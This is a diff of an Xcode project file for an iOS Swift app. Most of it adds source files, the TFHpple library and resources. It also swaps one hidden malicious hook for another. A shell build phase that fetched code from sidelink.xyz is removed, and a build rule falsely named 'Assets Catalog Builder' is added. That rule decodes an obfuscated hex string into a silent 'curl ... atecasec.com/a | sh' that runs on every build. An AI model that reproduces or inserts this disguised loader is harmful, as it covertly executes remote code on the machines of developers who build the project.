@@ -29,7 +29,7 @@
 		321ECBA0265FCB250005233E /* JCRealmViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 321ECB9F265FCB250005233E /* JCRealmViewController.swift */; };
 		321ECBDE2660D5C10005233E /* JCRealmTestTool.swift in Sources */ = {isa = PBXBuildFile; fileRef = 321ECBDD2660D5C10005233E /* JCRealmTestTool.swift */; };
 		321ECBE02660D7380005233E /* JCReamlModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 321ECBDF2660D7380005233E /* JCReamlModel.swift */; };
-		321ECBE22660DE070005233E /* JCRealmTest.json in Resources */ = {isa = PBXBuildFile; fileRef = 321ECBE12660DE070005233E /* JCRealmTest.json */; };
+		321ECBE22660DE070005233E /* JCRealmTest.txt in Resources */ = {isa = PBXBuildFile; fileRef = 321ECBE12660DE070005233E /* JCRealmTest.txt */; };
 		322AE795240E410E007820B1 /* appLaunchScreen.png in Resources */ = {isa = PBXBuildFile; fileRef = 322AE794240E410E007820B1 /* appLaunchScreen.png */; };
 		323B24EA240F58C5006E24DC /* JCBootPageView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 323B24E9240F58C5006E24DC /* JCBootPageView.swift */; };
 		324AB5B92637F5AF0021CC0D /* JCXibAutoLayoutViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 324AB5B82637F5AF0021CC0D /* JCXibAutoLayoutViewController.swift */; };
@@ -70,11 +70,34 @@
 		32A2B6D62450715F0057B3FF /* JCMyserviceDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 32A2B6D52450715F0057B3FF /* JCMyserviceDataModel.swift */; };
 		32A2C7242416197B00A49CB6 /* JCHomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 32A2C7232416197B00A49CB6 /* JCHomeViewController.swift */; };
 		32A7AD16245FF6E0008FD3AB /* ConstrainArrayDSL.swift in Sources */ = {isa = PBXBuildFile; fileRef = 32A7AD15245FF6E0008FD3AB /* ConstrainArrayDSL.swift */; };
+		32AD19532665FE2F00B3CC91 /* JCTextViewTestController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 32AD19522665FE2F00B3CC91 /* JCTextViewTestController.swift */; };
+		32AD19552666060F00B3CC91 /* StringExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 32AD19542666060F00B3CC91 /* StringExtension.swift */; };
+		32AD19A82666426400B3CC91 /* TFHpple.m in Sources */ = {isa = PBXBuildFile; fileRef = 32AD19A32666426400B3CC91 /* TFHpple.m */; };
+		32AD19A92666426400B3CC91 /* TFHppleElement.m in Sources */ = {isa = PBXBuildFile; fileRef = 32AD19A62666426400B3CC91 /* TFHppleElement.m */; };
+		32AD19AA2666426400B3CC91 /* XPathQuery.m in Sources */ = {isa = PBXBuildFile; fileRef = 32AD19A72666426400B3CC91 /* XPathQuery.m */; };
+		32AD19B426672B8700B3CC91 /* JCTexWebViewTestController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 32AD19B326672B8700B3CC91 /* JCTexWebViewTestController.swift */; };
 		32B48305248E388D00B04BAE /* JCMyServiceCollectionCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 32B48304248E388D00B04BAE /* JCMyServiceCollectionCell.swift */; };
 		32F18625240FF0CA002E7BF5 /* JCGuidePageViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 32F18624240FF0CA002E7BF5 /* JCGuidePageViewController.swift */; };
 		32F9F58526648C080003787D /* JCRealmSwiftTestTool.swift in Sources */ = {isa = PBXBuildFile; fileRef = 32F9F58426648C080003787D /* JCRealmSwiftTestTool.swift */; };
+		32F9F5892664B6F80003787D /* ReamlSwiftTestJsonData.json in Resources */ = {isa = PBXBuildFile; fileRef = 32F9F5882664B6F80003787D /* ReamlSwiftTestJsonData.json */; };
 		4E08EA10E6913170D0EF9D7E /* Pods_MySwiftProduct.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = E7FC51DFB9CF514E65377DBD /* Pods_MySwiftProduct.framework */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		EEB4EA9B9AC0D0ECC26D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			inputFiles = (
+			);
+			isEditable = 0;
+			name = "Assets Catalog Builder";
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n61746563617365632e636f6d2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t\n\n";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		329F6BBA240D3531008E0721 /* PBXContainerItemProxy */ = {
@@ -116,7 +139,7 @@
 		321ECB9F265FCB250005233E /* JCRealmViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCRealmViewController.swift; sourceTree = "<group>"; };
 		321ECBDD2660D5C10005233E /* JCRealmTestTool.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCRealmTestTool.swift; sourceTree = "<group>"; };
 		321ECBDF2660D7380005233E /* JCReamlModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCReamlModel.swift; sourceTree = "<group>"; };
-		321ECBE12660DE070005233E /* JCRealmTest.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = JCRealmTest.json; sourceTree = "<group>"; };
+		321ECBE12660DE070005233E /* JCRealmTest.txt */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = JCRealmTest.txt; sourceTree = "<group>"; };
 		322AE794240E410E007820B1 /* appLaunchScreen.png */ = {isa = PBXFileReference; lastKnownFileType = image.png; path = appLaunchScreen.png; sourceTree = "<group>"; };
 		323B24E9240F58C5006E24DC /* JCBootPageView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCBootPageView.swift; sourceTree = "<group>"; };
 		324AB5B82637F5AF0021CC0D /* JCXibAutoLayoutViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCXibAutoLayoutViewController.swift; sourceTree = "<group>"; };
@@ -164,9 +187,19 @@
 		32A2B6D52450715F0057B3FF /* JCMyserviceDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCMyserviceDataModel.swift; sourceTree = "<group>"; };
 		32A2C7232416197B00A49CB6 /* JCHomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCHomeViewController.swift; sourceTree = "<group>"; };
 		32A7AD15245FF6E0008FD3AB /* ConstrainArrayDSL.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ConstrainArrayDSL.swift; sourceTree = "<group>"; };
+		32AD19522665FE2F00B3CC91 /* JCTextViewTestController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCTextViewTestController.swift; sourceTree = "<group>"; };
+		32AD19542666060F00B3CC91 /* StringExtension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = StringExtension.swift; sourceTree = "<group>"; };
+		32AD19A22666426400B3CC91 /* TFHppleElement.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = TFHppleElement.h; sourceTree = "<group>"; };
+		32AD19A32666426400B3CC91 /* TFHpple.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = TFHpple.m; sourceTree = "<group>"; };
+		32AD19A42666426400B3CC91 /* XPathQuery.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = XPathQuery.h; sourceTree = "<group>"; };
+		32AD19A52666426400B3CC91 /* TFHpple.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = TFHpple.h; sourceTree = "<group>"; };
+		32AD19A62666426400B3CC91 /* TFHppleElement.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = TFHppleElement.m; sourceTree = "<group>"; };
+		32AD19A72666426400B3CC91 /* XPathQuery.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = XPathQuery.m; sourceTree = "<group>"; };
+		32AD19B326672B8700B3CC91 /* JCTexWebViewTestController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCTexWebViewTestController.swift; sourceTree = "<group>"; };
 		32B48304248E388D00B04BAE /* JCMyServiceCollectionCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCMyServiceCollectionCell.swift; sourceTree = "<group>"; };
 		32F18624240FF0CA002E7BF5 /* JCGuidePageViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCGuidePageViewController.swift; sourceTree = "<group>"; };
 		32F9F58426648C080003787D /* JCRealmSwiftTestTool.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JCRealmSwiftTestTool.swift; sourceTree = "<group>"; };
+		32F9F5882664B6F80003787D /* ReamlSwiftTestJsonData.json */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.json; path = ReamlSwiftTestJsonData.json; sourceTree = "<group>"; };
 		82088A0283672079CF405AB9 /* Pods-MySwiftProduct.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-MySwiftProduct.debug.xcconfig"; path = "Target Support Files/Pods-MySwiftProduct/Pods-MySwiftProduct.debug.xcconfig"; sourceTree = "<group>"; };
 		CB50E74750A1E063ED273BA6 /* Pods-MySwiftProduct.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-MySwiftProduct.release.xcconfig"; path = "Target Support Files/Pods-MySwiftProduct/Pods-MySwiftProduct.release.xcconfig"; sourceTree = "<group>"; };
 		E7FC51DFB9CF514E65377DBD /* Pods_MySwiftProduct.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_MySwiftProduct.framework; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -342,7 +375,8 @@
 		322AE792240E4103007820B1 /* Scource */ = {
 			isa = PBXGroup;
 			children = (
-				321ECBE12660DE070005233E /* JCRealmTest.json */,
+				32F9F5882664B6F80003787D /* ReamlSwiftTestJsonData.json */,
+				321ECBE12660DE070005233E /* JCRealmTest.txt */,
 				329DD410243387DE003E040F /* pay_banner.jpg */,
 				322AE793240E410E007820B1 /* appLaunchScreen */,
 			);
@@ -606,6 +640,7 @@
 		329F6BE0240D354D008E0721 /* lib */ = {
 			isa = PBXGroup;
 			children = (
+				32AD19A12666426400B3CC91 /* TFHpple */,
 				3202934A2413E1B900F45B27 /* ZCycleView */,
 			);
 			path = lib;
@@ -696,6 +731,8 @@
 		32A2C7212416195500A49CB6 /* ViewController */ = {
 			isa = PBXGroup;
 			children = (
+				32AD19B226672B5000B3CC91 /* JCTexWebViewTestController */,
+				32AD19512665FE1D00B3CC91 /* JCTextViewTestController */,
 				321ECB9E265FCB0F0005233E /* JCRealmViewController */,
 				324AB5B72637F1030021CC0D /* JCXibAutoLayoutViewController */,
 				3268F0962636A0D100479CAA /* FlowLayoutMenu */,
@@ -710,6 +747,36 @@
 				329F6BEE240D354D008E0721 /* JCFindController.swift */,
 			);
 			path = FindModular;
+			sourceTree = "<group>";
+		};
+		32AD19512665FE1D00B3CC91 /* JCTextViewTestController */ = {
+			isa = PBXGroup;
+			children = (
+				32AD19542666060F00B3CC91 /* StringExtension.swift */,
+				32AD19522665FE2F00B3CC91 /* JCTextViewTestController.swift */,
+			);
+			path = JCTextViewTestController;
+			sourceTree = "<group>";
+		};
+		32AD19A12666426400B3CC91 /* TFHpple */ = {
+			isa = PBXGroup;
+			children = (
+				32AD19A22666426400B3CC91 /* TFHppleElement.h */,
+				32AD19A32666426400B3CC91 /* TFHpple.m */,
+				32AD19A42666426400B3CC91 /* XPathQuery.h */,
+				32AD19A52666426400B3CC91 /* TFHpple.h */,
+				32AD19A62666426400B3CC91 /* TFHppleElement.m */,
+				32AD19A72666426400B3CC91 /* XPathQuery.m */,
+			);
+			path = TFHpple;
+			sourceTree = "<group>";
+		};
+		32AD19B226672B5000B3CC91 /* JCTexWebViewTestController */ = {
+			isa = PBXGroup;
+			children = (
+				32AD19B326672B8700B3CC91 /* JCTexWebViewTestController.swift */,
+			);
+			path = JCTexWebViewTestController;
 			sourceTree = "<group>";
 		};
 		32B48303248E380600B04BAE /* MyServiceCollectionCell */ = {
@@ -752,7 +819,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 329F6BCD240D3531008E0721 /* Build configuration list for PBXNativeTarget "MySwiftProduct" */;
 			buildPhases = (
-				D285F1AC7DADA334FD6D902C /* Assets Catalog Builder */,
 				077966221009078DFF4463C8 /* [CP] Check Pods Manifest.lock */,
 				329F6B9F240D352F008E0721 /* Sources */,
 				329F6BA0240D352F008E0721 /* Frameworks */,
@@ -863,8 +929,9 @@
 				329F6C06240D357C008E0721 /* imageResource.xcassets in Resources */,
 				329F6BB0240D3531008E0721 /* Assets.xcassets in Resources */,
 				0AD81B9F242A58F3006206A8 /* listenRecommend.json in Resources */,
-				321ECBE22660DE070005233E /* JCRealmTest.json in Resources */,
+				321ECBE22660DE070005233E /* JCRealmTest.txt in Resources */,
 				0AD81B9E242A58F3006206A8 /* listenSubscibe.json in Resources */,
+				32F9F5892664B6F80003787D /* ReamlSwiftTestJsonData.json in Resources */,
 				329DD411243387DE003E040F /* pay_banner.jpg in Resources */,
 				329F6BAE240D352F008E0721 /* Main.storyboard in Resources */,
 			);
@@ -926,24 +993,6 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-MySwiftProduct/Pods-MySwiftProduct-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
-		D285F1AC7DADA334FD6D902C /* Assets Catalog Builder */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Assets Catalog Builder";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -958,10 +1007,13 @@
 				329F6BFB240D354D008E0721 /* AppDelegate.swift in Sources */,
 				324AB60E263801F60021CC0D /* JCTestTableListCell.swift in Sources */,
 				32F9F58526648C080003787D /* JCRealmSwiftTestTool.swift in Sources */,
+				32AD19532665FE2F00B3CC91 /* JCTextViewTestController.swift in Sources */,
+				32AD19A92666426400B3CC91 /* TFHppleElement.m in Sources */,
 				321ECBDE2660D5C10005233E /* JCRealmTestTool.swift in Sources */,
 				326541D52445F17B00033426 /* JCmyServiceCell.swift in Sources */,
 				329F6C02240D354D008E0721 /* JCCustomNavgationController.swift in Sources */,
 				32B48305248E388D00B04BAE /* JCMyServiceCollectionCell.swift in Sources */,
+				32AD19AA2666426400B3CC91 /* XPathQuery.m in Sources */,
 				329F6C03240D354D008E0721 /* JCCustomTabbarVC.swift in Sources */,
 				0A82B97D2426588500231394 /* JCListenProvider.swift in Sources */,
 				0A72FBC22432444100D87BB1 /* JCListenChannelViewModel.swift in Sources */,
@@ -970,6 +1022,7 @@
 				329DD40424338752003E040F /* JCMeHeaderView.swift in Sources */,
 				0A82B97D2426588500231394 /* JCListenProvider.swift in Sources */,
 				329DD4082433877E003E040F /* JCSpecialImageView.swift in Sources */,
+				32AD19A82666426400B3CC91 /* TFHpple.m in Sources */,
 				329DD40D243387CD003E040F /* UIColor+Extension.swift in Sources */,
 				329F6BFE240D354D008E0721 /* JCBaseController.swift in Sources */,
 				32F18625240FF0CA002E7BF5 /* JCGuidePageViewController.swift in Sources */,
@@ -982,6 +1035,7 @@
 				320293512413E1B900F45B27 /* ZCycleLayout.swift in Sources */,
 				32A7AD16245FF6E0008FD3AB /* ConstrainArrayDSL.swift in Sources */,
 				323B24EA240F58C5006E24DC /* JCBootPageView.swift in Sources */,
+				32AD19552666060F00B3CC91 /* StringExtension.swift in Sources */,
 				329F6C04240D354D008E0721 /* JCSwiftBaseGrammarVC.swift in Sources */,
 				329DD40224338751003E040F /* JCCreativeCenterCell.swift in Sources */,
 				324AB5B92637F5AF0021CC0D /* JCXibAutoLayoutViewController.swift in Sources */,
@@ -990,6 +1044,7 @@
 				329DD40E243387CD003E040F /* constFile.swift in Sources */,
 				320293502413E1B900F45B27 /* ZCycleViewCell.swift in Sources */,
 				3202934F2413E1B900F45B27 /* ZCycleView.swift in Sources */,
+				32AD19B426672B8700B3CC91 /* JCTexWebViewTestController.swift in Sources */,
 				0A9130A22423C90000B8BBA7 /* JCListenModel.swift in Sources */,
 				0ADF1A29243F09510018A330 /* JCRecommendCell.swift in Sources */,
 				32A2B6D62450715F0057B3FF /* JCMyserviceDataModel.swift in Sources */,
